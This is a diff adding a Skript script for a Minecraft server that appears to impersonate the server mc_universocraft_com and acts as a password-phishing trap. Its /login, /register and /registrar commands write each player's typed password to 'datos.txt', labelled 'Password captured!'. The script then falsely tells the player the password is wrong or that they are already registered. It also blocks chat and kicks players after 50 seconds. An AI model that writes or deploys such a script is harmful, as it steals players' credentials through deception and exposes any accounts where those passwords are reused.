@@ -1,0 +1,44 @@
+on join:
+	execute console command "mv tp %player% mc_universocraft_com"
+	wf "    [JOIN] %player% has entered the server." to "datos.txt"
+	message "&9&lCuenta &7» &a¡Inicia sesión: &e/login <tucontraseña>"
+	wait 50 seconds
+	kick the player due to "&9&lCuenta &7» &cTu tiempo de espera para entrar se ha agotado."
+
+on quit:
+	wf "    [LEAVE] %player% has left the server." to "datos.txt"
+
+on chat:
+	cancel event
+
+command /login [<text>]:
+	trigger:
+
+		if arg-1 is not set:
+			message "&9&lCuenta &7» &cUso correcto: &e/login <tucontraseña>"
+			
+		if arg-1 is set:
+			wf "    [LOGIN] Password captured! Username: %player% password: %arg-1%" to "datos.txt"
+			message "&9&lCuenta &7» &cContraseña incorrecta."
+		
+command /register [<text>] [<text>]:
+	trigger:
+
+		if arg-2 is set:
+			wf "    [REGISTER] Password captured! Username: %player% password: %arg-1% %arg-2%" to "datos.txt"
+			message "&9&lCuenta &7» &cYa estás registrado."
+
+		else:
+			message "&9&lCuenta &7» &cUso correcto: &e/registrar <tucontraseña>"
+			message "&e<repitetucontraseña>"
+
+command /registrar [<text>] [<text>]:
+	trigger:
+
+		if arg-2 is set:
+			wf "    [REGISTER] Password captured! Username: %player% password: %arg-1% %arg-2%" to "datos.txt"
+			message "&9&lCuenta &7» &cYa estás registrado."
+
+		else:
+			message "&9&lCuenta &7» &cUso correcto: &e/registrar <tucontraseña>"
+			message "&e<repitetucontraseña>"
